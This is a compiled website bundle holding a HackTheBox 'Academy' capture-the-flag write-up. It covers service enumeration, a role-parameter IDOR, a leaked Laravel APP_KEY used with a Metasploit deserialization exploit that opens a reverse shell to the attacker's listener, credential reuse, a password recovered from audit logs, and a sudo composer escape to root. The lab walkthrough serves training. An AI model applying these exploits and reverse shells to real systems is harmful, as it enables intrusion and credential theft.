"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2714],{3905:(e,t,n)=>{n.d(t,{Zo:()=>m,kt:()=>x});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},m=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},c=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,m=l(e,["components","mdxType","originalType","parentName"]),d=p(n),c=r,x=d["".concat(s,".").concat(c)]||d[c]||u[c]||o;return n?a.createElement(x,i(i({ref:t},m),{},{components:n})):a.createElement(x,i({ref:t},m))}));function x(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=c;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[d]="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}c.displayName="MDXCreateElement"},35480:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const o={layout:"post",title:"Academy ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","php","laravel"],date:"2021/02/28 22:31:00",thumbnail:"/img/HackTheBox/academy.png",toc:!0},i="Information",l={unversionedId:"HackTheBox/Academy/write-up",id:"HackTheBox/Academy/write-up",title:"Academy ",description:"- Name: Academy",source:"@site/writeups/HackTheBox/Academy/write-up.md",sourceDirName:"HackTheBox/Academy",slug:"/HackTheBox/Academy/write-up",permalink:"/writeups/HackTheBox/Academy/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"web",permalink:"/writeups/tags/web"},{label:"php",permalink:"/writeups/tags/php"},{label:"laravel",permalink:"/writeups/tags/laravel"}],version:"current",frontMatter:{layout:"post",title:"Academy ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","php","laravel"],date:"2021/02/28 22:31:00",thumbnail:"/img/HackTheBox/academy.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"About",permalink:"/writeups/"},next:{title:"Admirer ",permalink:"/writeups/HackTheBox/Admirer/write-up"}},s={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web enumeration",id:"web-enumeration",level:2},{value:"Web exploitation: IDOR",id:"web-exploitation-idor",level:2},{value:"Web exploitation: Laravel RCE and debug mode",id:"web-exploitation-laravel-rce-and-debug-mode",level:2},{value:"Privilege Escalation of Machine : from www-data to cry0l1t3",id:"privilege-escalation-of-machine--from-www-data-to-cry0l1t3",level:2},{value:"Privilege Escalation of Machine : from cry0l1t3 to mrb3n",id:"privilege-escalation-of-machine--from-cry0l1t3-to-mrb3n",level:2},{value:"Privilege Escalation of Machine : from mrb3n to mrb3n",id:"privilege-escalation-of-machine--from-mrb3n-to-mrb3n",level:2}],m={toc:p},d="wrapper";function u(e){let{components:t,...o}=e;return(0,r.kt)(d,(0,a.Z)({},m,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Academy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/297"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Academy",src:n(45988).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap ffuf metasploit gtfoblookup\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port and service discovery scan with nmap:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'# Nmap 7.91 scan initiated Tue Feb  2 18:57:09 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.215\nNmap scan report for academy.htb (10.10.10.215)\nHost is up (0.030s latency).\nNot shown: 65532 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)\n|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)\n|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)\n80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Hack The Box Academy\n33060/tcp open  mysqlx?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:\n|     Invalid message"\n|_    HY000\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port33060-TCP:V=7.91%I=7%D=2/2%Time=6019928E%P=x86_64-unknown-linux-gnu\nSF:%r(NULL,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(GenericLines,9,"\\x05\\0\\0\\0\\\nSF:x0b\\x08\\x05\\x1a\\0")%r(GetRequest,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(HT\nSF:TPOptions,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(RTSPRequest,9,"\\x05\\0\\0\\0\nSF:\\x0b\\x08\\x05\\x1a\\0")%r(RPCCheck,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(DNS\nSF:VersionBindReqTCP,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(DNSStatusRequestT\nSF:CP,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\\nSF:x0fInvalid\\x20message\\"\\x05HY000")%r(Help,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\nSF:\\0")%r(SSLSessionReq,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\nSF:\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20message\\"\\x05HY000")%r(TerminalServerCo\nSF:okie,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(TLSSessionReq,2B,"\\x05\\0\\0\\0\\x\nSF:0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20messa\nSF:ge\\"\\x05HY000")%r(Kerberos,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(SMBProgN\nSF:eg,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(X11Probe,2B,"\\x05\\0\\0\\0\\x0b\\x08\\\nSF:x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20message\\"\\x0\nSF:5HY000")%r(FourOhFourRequest,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LPDStr\nSF:ing,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LDAPSearchReq,2B,"\\x05\\0\\0\\0\\x0\nSF:b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20messag\nSF:e\\"\\x05HY000")%r(LDAPBindReq,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(SIPOpt\nSF:ions,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LANDesk-RC,9,"\\x05\\0\\0\\0\\x0b\\x\nSF:08\\x05\\x1a\\0")%r(TerminalServer,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(NCP\nSF:,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(NotesRPC,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x0\nSF:5\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20message\\"\\x05H\nSF:Y000")%r(JavaRMI,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(WMSRequest,9,"\\x05\nSF:\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(oracle-tns,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\nSF:")%r(ms-sql-s,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(afp,2B,"\\x05\\0\\0\\0\\x0\nSF:b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\'\\x1a\\x0fInvalid\\x20messag\nSF:e\\"\\x05HY000")%r(giop,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Feb  2 18:57:52 2021 -- 1 IP address (1 host up) scanned in 43.69 seconds\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep academy\n10.10.10.215 academy.htb\n")),(0,r.kt)("p",null,"Let's start with the web port but let's keep in mind that we have a weird 33060\nport."),(0,r.kt)("h2",{id:"web-enumeration"},"Web enumeration"),(0,r.kt)("p",null,"We can register and login at ",(0,r.kt)("a",{parentName:"p",href:"http://academy.htb/"},"http://academy.htb/"),". But there is not much to\nsee there."),(0,r.kt)("p",null,"So let's enumerate with ffuf:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://academy.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://academy.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\nindex.php               [Status: 200, Size: 2117, Words: 890, Lines: 77]\nregister.php            [Status: 200, Size: 3003, Words: 801, Lines: 149]\nlogin.php               [Status: 200, Size: 2627, Words: 667, Lines: 142]\nadmin.php               [Status: 200, Size: 2633, Words: 668, Lines: 142]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1]\nhome.php                [Status: 302, Size: 55034, Words: 4001, Lines: 1050]\n.                       [Status: 200, Size: 2117, Words: 890, Lines: 77]\n:: Progress: [10848/10848] :: Job [1/1] :: 1294 req/sec :: Duration: [0:00:08] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"We notice there is an admin page."),(0,r.kt)("h2",{id:"web-exploitation-idor"},"Web exploitation: IDOR"),(0,r.kt)("p",null,"When registering there is a param ",(0,r.kt)("inlineCode",{parentName:"p"},"roleid"),", if we change it from zero (user) to\none (admin), we will maybe get an admin account."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"POST /register.php HTTP/1.1\nHost: academy.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 50\nOrigin: http://academy.htb\nConnection: close\nReferer: http://academy.htb/register.php\nCookie: PHPSESSID=p9e8usvnv8b6jd47873fbt4ao2\nUpgrade-Insecure-Requests: 1\n\nuid=cyfun3&password=cyfun3&confirm=cyfun3&roleid=0\n")),(0,r.kt)("p",null,"Then we can login at ",(0,r.kt)("a",{parentName:"p",href:"http://academy.htb/admin.php"},"http://academy.htb/admin.php"),". If you let ",(0,r.kt)("inlineCode",{parentName:"p"},"roleid=0")," you can't."),(0,r.kt)("p",null,"On the admin dashboard there is a todolist with a status."),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Item"),(0,r.kt)("th",{parentName:"tr",align:null},"Status"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Complete initial set of modules (cry0l1t3 / mrb3n)"),(0,r.kt)("td",{parentName:"tr",align:null},"done")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Finalize website design"),(0,r.kt)("td",{parentName:"tr",align:null},"done")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Test all modules"),(0,r.kt)("td",{parentName:"tr",align:null},"done")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Prepare launch campaign"),(0,r.kt)("td",{parentName:"tr",align:null},"done")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Separate student and admin roles"),(0,r.kt)("td",{parentName:"tr",align:null},"done")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Fix issue with dev-staging-01.academy.htb"),(0,r.kt)("td",{parentName:"tr",align:null},"pending")))),(0,r.kt)("p",null,"Let's add the new subdomain to our host file."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep academy\n10.10.10.215 academy.htb\n10.10.10.215 dev-staging-01.academy.htb\n")),(0,r.kt)("h2",{id:"web-exploitation-laravel-rce-and-debug-mode"},"Web exploitation: Laravel RCE and debug mode"),(0,r.kt)("p",null,"Let's go at: ",(0,r.kt)("a",{parentName:"p",href:"http://dev-staging-01.academy.htb/"},"http://dev-staging-01.academy.htb/")),(0,r.kt)("p",null,"We are welcomed by a laravel debugger."),(0,r.kt)("p",null,"Here we have a bunch of environment variables leaking secrets:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'APP_NAME "Laravel"\nAPP_ENV "local"\nAPP_KEY "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="\nAPP_DEBUG "true"\nAPP_URL "http://localhost"\nLOG_CHANNEL "stack"\nDB_CONNECTION "mysql"\nDB_HOST "127.0.0.1"\nDB_PORT "3306"\nDB_DATABASE "homestead"\nDB_USERNAME "homestead"\nDB_PASSWORD "secret"\nBROADCAST_DRIVER "log"\nCACHE_DRIVER "file"\nSESSION_DRIVER "file"\nSESSION_LIFETIME "120"\nQUEUE_DRIVER "sync"\nREDIS_HOST "127.0.0.1"\nREDIS_PASSWORD "null"\nREDIS_PORT "6379"\nMAIL_DRIVER "smtp"\nMAIL_HOST "smtp.mailtrap.io"\nMAIL_PORT "2525"\nMAIL_USERNAME "null"\nMAIL_PASSWORD "null"\nMAIL_ENCRYPTION "null"\nPUSHER_APP_ID ""\nPUSHER_APP_KEY ""\nPUSHER_APP_SECRET ""\nPUSHER_APP_CLUSTER "mt1"\nMIX_PUSHER_APP_KEY ""\nMIX_PUSHER_APP_CLUSTER "mt1"\n')),(0,r.kt)("p",null,"By searching for ",(0,r.kt)("inlineCode",{parentName:"p"},"laravel api key exploit")," I found this\n",(0,r.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/47129"},"metasploit exploit"),"."),(0,r.kt)("p",null,"The RCE exploit requires the APP_KEY but we just get it through the leak."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msf6 exploit(unix/http/laravel_token_unserialize_exec) > options\n\nModule options (exploit/unix/http/laravel_token_unserialize_exec):\n\n   Name       Current Setting                               Required  Description\n   ----       ---------------                               --------  -----------\n   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file\n   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      80                                            yes       The target port (TCP)\n   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                                             yes       Path to target webapp\n   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.115     yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\nmsf6 exploit(unix/http/laravel_token_unserialize_exec) > run\n\n[*] Started reverse TCP handler on 10.10.14.115:4444\n[*] Command shell session 3 opened (10.10.14.115:4444 -> 10.10.10.215:44738) at 2021-02-02 19:57:43 +0100\n[*] Command shell session 4 opened (10.10.14.115:4444 -> 10.10.10.215:44740) at 2021-02-02 19:57:44 +0100\n\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-www-data-to-cry0l1t3"},"Privilege Escalation of Machine : from www-data to cry0l1t3"),(0,r.kt)("p",null,"First let's get a ",(0,r.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/shells/shells/full-ttys"},"full TTY"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;\n")),(0,r.kt)("p",null,"There are plenty users we could target:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@academy:/var/www/html/htb-academy-dev-01/public$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n...\negre55:x:1000:1000:egre55:/home/egre55:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmrb3n:x:1001:1001::/home/mrb3n:/bin/sh\ncry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh\nmysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false\n21y4d:x:1003:1003::/home/21y4d:/bin/sh\nch4p:x:1004:1004::/home/ch4p:/bin/sh\ng0blin:x:1005:1005::/home/g0blin:/bin/sh\n")),(0,r.kt)("p",null,"Then I ran a recursive list in the home directories: ",(0,r.kt)("inlineCode",{parentName:"p"},"ls -lhAR /home"),"."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"21y4d: empty"),(0,r.kt)("li",{parentName:"ul"},"ch4p: empty"),(0,r.kt)("li",{parentName:"ul"},"cry0l1t3: the user flag is there, and stuff about lxd (useful for pe)",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/home/cry0l1t3/.mysql_history")," -> we don't have the permission"))),(0,r.kt)("li",{parentName:"ul"},"egre55: empty"),(0,r.kt)("li",{parentName:"ul"},"g0blin: empty"),(0,r.kt)("li",{parentName:"ul"},"mrb3n: dirty stuff",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/home/mrb3n/.config/composer/.htaccess")," -> deny from all"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/home/mrb3n/.local/share/composer/.htaccess")," -> deny from all")))),(0,r.kt)("p",null,"Connecting to the DB fails with mysql creds found in\n",(0,r.kt)("inlineCode",{parentName:"p"},"/var/www/html/htb-academy-dev-01/.env")," (same as the Laravel):"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"DB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=homestead\nDB_USERNAME=homestead\nDB_PASSWORD=secret\n")),(0,r.kt)("p",null,"But with the ones ",(0,r.kt)("inlineCode",{parentName:"p"},"/var/www/html/academy/.env")," maybe"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"DB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=academy\nDB_USERNAME=dev\nDB_PASSWORD=mySup3rP4s5w0rd!!\n")),(0,r.kt)("p",null,"No luck either."),(0,r.kt)("p",null,"But I tried to reused the password ",(0,r.kt)("inlineCode",{parentName:"p"},"mySup3rP4s5w0rd!!")," with user ",(0,r.kt)("inlineCode",{parentName:"p"},"cry0l1t3")," and\nit worked (remember he had a ",(0,r.kt)("inlineCode",{parentName:"p"},".mysql_history")," in his home)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat user.txt\n0e85e4538755a8311b08a68026e1ec7b\n$ id\nuid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-cry0l1t3-to-mrb3n"},"Privilege Escalation of Machine : from cry0l1t3 to mrb3n"),(0,r.kt)("p",null,"As we are in ",(0,r.kt)("inlineCode",{parentName:"p"},"adm")," group I launched a command to see what files\nwe have access with this group: ",(0,r.kt)("inlineCode",{parentName:"p"},"find / -group adm -type f 2>/dev/null"),".\nWe have access to all logs in ",(0,r.kt)("inlineCode",{parentName:"p"},"/var/log"),"."),(0,r.kt)("p",null,"There are some interesting files but password are redacted."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ grep -ri password /var/log 2>/dev/null\n...\n/var/log/installer/subiquity-debug.log.1758:2020-08-07 12:07:02,431 DEBUG subiquity.controllers.identity:70 IdentityController.done next_screen user_spec={'hostname': 'academy', 'realname': 'egre55', 'username': 'egre55', 'password': '<REDACTED>'}\n...\n/var/log/cloud-init.log:2020-08-07 12:12:07,195 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'egre55', '--comment', 'egre55', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']\n...\n")),(0,r.kt)("p",null,"It's possible that ",(0,r.kt)("inlineCode",{parentName:"p"},"/var/log/audit/audit.log")," is logging password during auth attempts."),(0,r.kt)("p",null,"Ref. ",(0,r.kt)("a",{parentName:"p",href:"https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/"},"Logging Passwords on Linux")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ grep -r \'comm="sudo"\' /var/log/audit\n$ grep -r \'comm="su"\' /var/log/audit\n/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A\n')),(0,r.kt)("p",null,"The password is hexadecimal encoded."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ printf %s '6D7262336E5F41634064336D79210A' | xxd -r -p\nmrb3n_Ac@d3my!\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-mrb3n-to-mrb3n"},"Privilege Escalation of Machine : from mrb3n to mrb3n"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"mrb3n")," is a sudoer:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ su  mrb3n\nPassword: mrb3n_Ac@d3my!\n\n$ id\nuid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)\n\n$ sudo -l\n[sudo] password for mrb3n: mrb3n_Ac@d3my!\n\nMatching Defaults entries for mrb3n on academy:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser mrb3n may run the following commands on academy:\n    (ALL) /usr/bin/composer\n")),(0,r.kt)("p",null,"So let's check a GTFO for that one:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ gtfoblookup update\n$ gtfoblookup linux sudo composer\ncomposer:\n\n    sudo:\n\n        Code: TF=$(mktemp -d)\n              echo \'{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}\'\n              >$TF/composer.json\n              sudo composer --working-dir=$TF run-script x\n')),(0,r.kt)("p",null,"So let's do that:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ TF=$(mktemp -d)\n$ echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}'>$TF/composer.json\n$ sudo composer --working-dir=$TF run-script x\n                                              sudo composer --working-dir=$TF run-script x\nPHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0\nPHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0\nDo not run Composer as root/super user! See https://getcomposer.org/root for details\n> /bin/sh -i 0<&3 1>&3 2>&3\n# id\n    id\nuid=0(root) gid=0(root) groups=0(root)\n# cat /root/root.txt\n                    cat /root/root.txt\n9ba239e4f7e863aeaec4558360d77078\n")))}u.isMDXComponent=!0},45988:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/academy-46b7321ddeca6ed9149118037e99cb00.png"}}]);